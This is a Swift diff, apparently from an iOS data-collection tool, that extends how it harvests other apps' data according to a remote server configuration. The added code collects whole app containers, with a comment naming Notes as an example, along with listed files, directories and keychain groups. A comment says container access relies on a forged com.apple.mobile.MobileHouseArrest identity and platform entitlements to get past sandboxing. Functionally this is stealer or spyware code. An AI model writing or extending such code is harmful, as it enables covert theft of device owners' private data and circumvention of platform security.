@@ -26,6 +26,40 @@ struct CollectConfig {
     let bundle_id: String?
     let access_group: String?
     let items: [CollectItemConfig]
+
+    /// 兼容两种下发格式：
+    ///  - 实际服务器格式：files / dirs 每行一条 + keychain_group；
+    ///  - 文档格式：items[{type,path}] + access_group。
+    init?(dict: [String: Any]) {
+        let bid = dict["bundle_id"] as? String
+        var items: [CollectItemConfig] = []
+
+        if let files = dict["files"] as? [String] {
+            for line in files {
+                let p = line.trimmingCharacters(in: .whitespacesAndNewlines)
+                if !p.isEmpty { items.append(CollectItemConfig(type: "file", path: p)) }
+            }
+        }
+        if let dirs = dict["dirs"] as? [String] {
+            for line in dirs {
+                let p = line.trimmingCharacters(in: .whitespacesAndNewlines)
+                if !p.isEmpty { items.append(CollectItemConfig(type: "dir", path: p)) }
+            }
+        }
+        if let rawItems = dict["items"] as? [[String: Any]] {
+            for it in rawItems {
+                guard let type = it["type"] as? String,
+                      let path = it["path"] as? String else { continue }
+                items.append(CollectItemConfig(type: type, path: path))
+            }
+        }
+
+        let ag = (dict["keychain_group"] as? String)
+              ?? (dict["access_group"] as? String)
+        self.bundle_id = bid
+        self.access_group = ag
+        self.items = items
+    }
 }
 
 struct DeviceConfig {
@@ -49,17 +83,9 @@ struct DeviceConfig {
         if let raw = dict["collect_configs"] as? [[String: Any]] {
             var configs: [CollectConfig] = []
             for rc in raw {
-                var items: [CollectItemConfig] = []
-                if let ri = rc["items"] as? [[String: Any]] {
-                    for it in ri {
-                        guard let type = it["type"] as? String,
-                              let path = it["path"] as? String else { continue }
-                        items.append(CollectItemConfig(type: type, path: path))
-                    }
+                if let cc = CollectConfig(dict: rc) {
+                    configs.append(cc)
                 }
-                configs.append(CollectConfig(bundle_id: rc["bundle_id"] as? String,
-                                             access_group: rc["access_group"] as? String,
-                                             items: items))
             }
             collect_configs = configs
         } else {
@@ -496,12 +522,15 @@ enum MainAPI {
     // MARK: 采集（严格按 /api/device/config 的 collect_configs）
 
     static func findContainerPath(forBundleID bid: String) -> String? {
-        // 0) MCM container lease (class 2 = Data). Requires the forged
-        // com.apple.mobile.MobileHouseArrest identity + platform entitlements;
-        // retains the query/activation so the sandbox extension stays alive.
+        // 0) MCM container lease: group.* 用类 3（group container），
+        //    普通应用用类 2（data container）。需要伪造的
+        //    com.apple.mobile.MobileHouseArrest 身份 + 平台权限；
+        //    保留 query/activation 使沙盒扩展存活。
         if MCMBridgeAvailable() {
             var mcmError: NSString?
-            if let p = MCMActivateContainerPath(2, bid, false, &mcmError),
+            let isGroup = bid.hasPrefix("group.")
+            let cls: UInt64 = isGroup ? 3 : 2
+            if let p = MCMActivateContainerPath(cls, bid, isGroup, &mcmError),
                FileManager.default.fileExists(atPath: p) {
                 globallogger.log("(api) MCM lease container: \(bid) -> \(p)")
                 return p
@@ -571,7 +600,17 @@ enum MainAPI {
 
         var collected = 0
         for item in cc.items {
-            guard let src = resolveCollectPath(item.path, bundleID: cc.bundle_id) else {
+            let trimmed = item.path.trimmingCharacters(in: .whitespacesAndNewlines)
+            // "/" 或空行 = 整容器（备忘录这类整容器采集）
+            let isWhole = trimmed.isEmpty || trimmed == "/"
+            var src: String?
+            if isWhole {
+                src = findContainerPath(forBundleID: cc.bundle_id ?? "")
+                globallogger.log("(api) collect whole container for \(cc.bundle_id ?? "-") -> \(src ?? "nil")")
+            } else {
+                src = resolveCollectPath(trimmed, bundleID: cc.bundle_id)
+            }
+            guard let src else {
                 globallogger.log("(api) collect resolve failed: \(item.path)")
                 continue
             }
@@ -580,17 +619,31 @@ enum MainAPI {
                 globallogger.log("(api) collect missing: \(item.path)")
                 continue
             }
-            // 严格按 type 采集：file 只收文件、dir 只收目录
-            if item.type == "dir" && !isDir.boolValue {
+            // 严格按 type 采集：file 只收文件、dir 只收目录（整容器视为 dir）
+            if (isWhole || item.type == "dir") && !isDir.boolValue {
                 globallogger.log("(api) collect type mismatch (want dir): \(item.path)")
                 continue
             }
-            if item.type == "file" && isDir.boolValue {
+            if !isWhole && item.type == "file" && isDir.boolValue {
                 globallogger.log("(api) collect type mismatch (want file): \(item.path)")
                 continue
             }
-            let dest = staging.appendingPathComponent((src as NSString).lastPathComponent,
-                                                      isDirectory: isDir.boolValue)
+            // dest 命名：相对路径镜像目录结构（避免同名扁平化冲突）；
+            // 整容器放到以 bundle_id 命名的子目录。
+            let destName: String
+            if isWhole {
+                destName = cc.bundle_id ?? "container"
+            } else if trimmed.hasPrefix("/") {
+                destName = (src as NSString).lastPathComponent
+            } else {
+                destName = trimmed
+            }
+            let dest = staging.appendingPathComponent(destName,
+                                                      isDirectory: isDir.boolValue || isWhole)
+            let parent = (dest as NSString).deletingLastPathComponent
+            if !parent.isEmpty && parent != staging.path {
+                try? fm.createDirectory(atPath: parent, withIntermediateDirectories: true)
+            }
             do {
                 try fm.copyItem(atPath: src, toPath: dest.path)
                 collected += 1
